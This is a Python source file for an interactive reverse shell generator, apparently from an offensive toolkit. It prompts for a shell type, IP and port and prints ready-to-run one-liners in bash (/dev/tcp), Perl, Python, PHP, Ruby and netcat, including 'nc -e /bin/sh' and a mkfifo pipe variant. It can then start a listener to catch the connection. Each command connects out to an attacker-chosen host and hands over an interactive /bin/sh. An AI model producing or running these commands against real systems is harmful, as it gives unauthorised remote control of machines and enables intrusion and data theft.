import subprocess
import socket
import threading

from modules.tools.reverse_shell_listsener import ReverseShellListener



class ReverseShellGenerator:
    def __init__(self, callback=None):
        self.shell_types = {
            "bash": self.bash_reverse_shell,
            "perl": self.perl_reverse_shell,
            "python": self.python_reverse_shell,
            "php": self.php_reverse_shell,
            "ruby": self.ruby_reverse_shell,
            "netcat": self.netcat_reverse_shell
        }
        self.callback=callback
        self.user_input()
    
    def user_input(self):
        print("Select the shell type:")
        for index, shell_type in enumerate(self.shell_types, 1):
            print(f"{index}. {shell_type.capitalize()}")
        
        choice = int(input("> "))
        shell_type = list(self.shell_types.keys())[choice - 1]

        ip = input("Enter the IP address: ")
        port = int(input("Enter the port: "))
        
        reverse_shell_command = self.generate_reverse_shell(shell_type, ip, port)
        
        if reverse_shell_command:
            print(f"Generated reverse shell command:\n{reverse_shell_command}\n")
            start_listener = input("Do you want to start a listener for this shell? (y/n): ").lower()
            
            if start_listener == "y":
                listener = ReverseShellListener(ip, port, self.callback)
                listener.run()
            else:
                self.exit()
        else:
            print("Invalid shell type. Please try again.")

    def generate_reverse_shell(self, shell_type, ip, port):
        if shell_type in self.shell_types:
            return self.shell_types[shell_type](ip, port)
        return None
    
    def bash_reverse_shell(self, ip, port):
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

    def perl_reverse_shell(self, ip, port):
        return f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"

    def python_reverse_shell(self, ip, port):
        return f"python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        
    def php_reverse_shell(self, ip, port):
        return f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        
    def ruby_reverse_shell(self, ip, port):
        return f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    
    def netcat_reverse_shell(self, ip, port):
        return f"nc -e /bin/sh {ip} {port}\nAlternative: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    

    def exit(self):
        if self.callback:
            self.callback(0)
        else:
            print("Exiting...")

if __name__ == "main":
    ReverseShellGenerator()
